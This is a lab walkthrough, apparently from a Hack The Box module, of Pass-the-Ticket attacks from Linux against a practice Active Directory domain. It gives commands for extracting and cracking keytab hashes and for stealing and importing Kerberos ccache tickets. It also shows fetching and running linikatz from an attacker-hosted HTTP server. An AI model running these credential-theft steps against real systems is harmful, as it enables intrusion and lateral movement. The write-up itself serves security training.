---
title: "Pass the Ticket (PtT) from Linux"
date: 2026-05-20
draft: false
tags:
  - htb
  - ptt
  - linux
---

### Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

connect to the machine:
```
ssh david@inlanefreight.htb@$IPADRESS$ -p 2222
```
enter the credentials and you will find the flag.

### Which group can connect to LINUX01?
you can find the answer using this command:
```
realm list
```

### Look for a keytab file that you have read and write access. Submit the file name as a response.

find keytab files:
```
find / -name *keytab* -ls 2>/dev/null
```
we need to look for a file which gives us a read and write access:
`-rw-rw-rw-`

### Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.
```
python3 /opt/keytabextract.py $keytabfile$
```

Once we find NTLM hash we can crack it. First, we need to prepare `.txt` file:
```
echo 'carlos:$NTLMhash$' > hash.txt
```

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

after getting the **password** we can ssh into it and find the flag:
```
ssh carlos@inlanefreight.htb@$IPaddress$ -p 2222
```

```
carlos@inlanefreight.htb@linux01:~$ ls
flag.txt  script-test-results.txt
carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
```

### Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

checking the crontab:
```
crontab -l
```

```
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh 
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

carlos@inlanefreight.htb@linux01:~$ kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
```

unfortunately, it won't work since it has only AES-256, dig more:
```
carlos@inlanefreight.htb@linux01:~/.scripts$ ls
john.keytab  kerberos_script_test.sh  svc_workstations._all.kt  svc_workstations.kt
```

extract from  `all.kt`:
```
python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
```

now we have NTLM hash, so we can crack it again using john:
```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

now log in to svc_workstations account and find the flag:
```
su svc_workstations@inlanefreight.htb
```

### Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

```
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
```

we have sudo privileges, so we can read the flag:
```
sudo cat /root/flag.txt
```

### Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

go to `/tmp` folder, find julio's ticket and copy it to folder of your choice:
```
cp /tmp/$julio'sFile$ /opt
```
export it:
```
export KRB5CCNAME=/opt/$julio'sFile$
```

### Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

get the `linikatz`:
```
git clone https://github.com/CiscoCXSecurity/linikatz.git
```
go to repository and setup http server to transfer the file to machine:
```
cd linikatz/
python3 -m http.server 8888
```
get the file and run it:
```
curl http://$yourIP$:8888/linikatz.sh -o lini.sh
chmod +x lini.sh
./lini.sh
```

copy the ticket for Linux01:
```
cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB /root
```
export ccname, connect to smb share and get the flag:
```
export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB
smbclient //DC01/linux01 -k

smb: \> get flag.txt 
```



